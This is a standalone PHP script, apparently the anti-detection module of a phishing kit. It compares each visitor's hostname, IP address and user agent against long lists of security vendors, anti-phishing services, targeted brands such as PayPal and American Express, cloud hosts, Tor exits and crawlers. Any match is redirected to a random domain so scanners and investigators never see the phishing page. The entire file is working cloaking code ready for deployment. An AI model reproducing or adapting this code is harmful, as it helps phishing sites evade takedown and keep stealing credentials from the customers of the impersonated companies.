<?php
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$botredirection = "https://".md5(rand(11111,99999)).".com";
$blocked_words = array("deltainfocom","dnsserverhosting","Java/1.6.0_22","Go-http-client/1.1","drweb","Dr.Web","hostinger","scanurl","above","level3","level","involta","SOLUTIONPRO-NET","SOLUTION","SolutionPro","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal","facebook","ebay","Baiduspider","ia_archiver","R6_FeedFetcher","NetcraftSurveyAgent","Sogou web spider","PrintfulBot","UnwindFetchor","urlresolver","Butterfly","TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms","YandexBot","SearchmetricsBot","picsearch","TweetedTimes Bot","QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIX Crawler","R6_CommentReader","magpie-crawler","GrapeshotCrawler","PercolateCrawler","MaxPointCrawler","R6_FeedFetcher","NetSeer crawler","grokkit-crawler","SMXCrawler","PulseCrawler","Y!J-BRW","datasift","80legs.com/webcrawler","Mediapartners-Google","Spinn3r","InAGist","Python-urllib","python-requests","NING","TencentTraveler","Feedfetcher-Google","mon.itor.us","p3pwgdsn","sucuri.net","messagelabs","torservers","trendmicro","spbot","Feedly","bot","curl","spider","crawler");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("Location: ".$botredirection);
        exit();
    }
}

$bannedIP = array("74.136.166.70","66.33.200.4","109.77.89.15","172.58.143.226","174.207.140.198","172.255.125.168","60.243.46.244","172.58.141.115","185.94.192.35",
"51.37.192.244",
"104.231.164.113",
"87.115.231.201",
"217.138.194.125",
"82.132.230.217",
"23.129.64.236",
"46.134.7.80",
"191.96.168.231",
"107.170.23.208",
"87.115.231.148",
"185.12.45.115",
"192.241.206.224",
"192.35.168.112",
"174.72.185.59",
"194.169.241.170",
"192.241.212.97",
"27.5.77.27",
"192.241.211.252",
"104.129.18.19",
"27.5.110.233",
"159.89.220.57",
"185.77.248.81",
"192.241.212.172",
"192.241.199.102",
"212.102.33.36",
"46.135.31.155",
"213.1.31.158",
"14.63.221.245",
"216.218.134.18",
"5.226.142.240",
"46.19.141.82",
"192.241.212.58",
"167.99.130.201",
"143.110.247.166",
"178.128.219.39",
"143.110.155.194",
"159.65.252.120",
"159.89.186.68",
"162.218.65.10",
"192.241.215.78",
"90.187.70.217",
"198.147.22.235",
"192.35.168.64",
"192.241.214.230",
"27.5.72.119",
"213.205.200.79",
"84.17.42.15",
"60.243.71.91",
"62.254.71.123",
"89.44.201.118",
"192.241.220.141",
"87.115.231.238",
"82.64.198.149",
"80.44.23.176",
"192.241.218.226",
"88.107.191.8",
"82.132.226.71",
"46.135.18.209",
"178.18.250.225",
"191.101.31.21",
"212.102.37.72",
"138.186.141.158",
"150.143.151.155",
"192.241.216.162",
"104.129.56.146",
"46.135.21.11",
"87.115.231.213",
"192.241.193.248",
"87.120.254.114",
"185.63.188.200","192.35.168.80","204.101.161.159","69.164.111.198","^206.207.*.*","^209.19.*.*","^207.70.*.*","^185.75.*.*","^193.226.*.*","^66.102.*.*","^64.71.*.*","^69.164.*.*","^64.74.*.*","^64.235.*.*","^4.14.64.*.*","^4.14.64.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^72.13.86.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.*","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","4.14.0.0","5.189.142.136","204.101.161.159","198.148.78.133","89.197.44.226","13.112.251.210","46.101.119.24","87.113.78.97","46.101.119.24","165.227.0.128","217.182.168.178","13.112.251.210","217.182.168.178","165.227.0.128","46.101.119.24","13.112.251.210","51.15.136.98","80.67.172.162","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.*","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
    header('Location: '.$botredirection);
    exit();
} else {
    foreach($bannedIP as $ip) {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
            header('Location: '.$botredirection);
            exit();
        }
    }
}

$blocked_words2 = array("Java/1.6.0_22","bot","above","google","softlayer","amazonaws","cyveillance","compatible","facebook","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","Trident","X11","crawler","urlredirectresolver","jetbrains","spam","windows 95","windows 98","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","big brother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","die blinde kuh","digger","ditto","dmoz","docomo","download express","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3 search engine","esther","evliya celebi","ezresult","falcon","felix ide","ferret","fetchrover","fido","findlinks","fireball","fish search","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hku www octopus","homerweb","htdig","html index","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspector web","intelliagent","internet shinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","link validator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsoft url control","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsa beta","nec-meshexplorer","nederland.zoek","netcarta webmap engine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch","nzexplorer","objectssearch","occam","omni","open text","openfind","openintelligencedata","orb search","osis-project","pack rat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgp key agent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","popular iconoclast","psycheclone","publisher","python","rambler","raven search","roach","road runner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","site searcher","site valet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tach black widow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","url check","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","web core","web hopper","web wombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblog monitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wild ferret","worldlight","wwwc","wwwster","xenu","xift","xirq","yandex","yanga","yeti","yahoo!","FreeBSD","msnbot","YahooSeeker","bingbot","facebookexternalhit","ubuntu");
foreach ($blocked_words2 as $word2) {
    if(stripos($_SERVER['HTTP_USER_AGENT'],$word2)){
        header('Location: '.$botredirection);
        exit();
    }
}

?>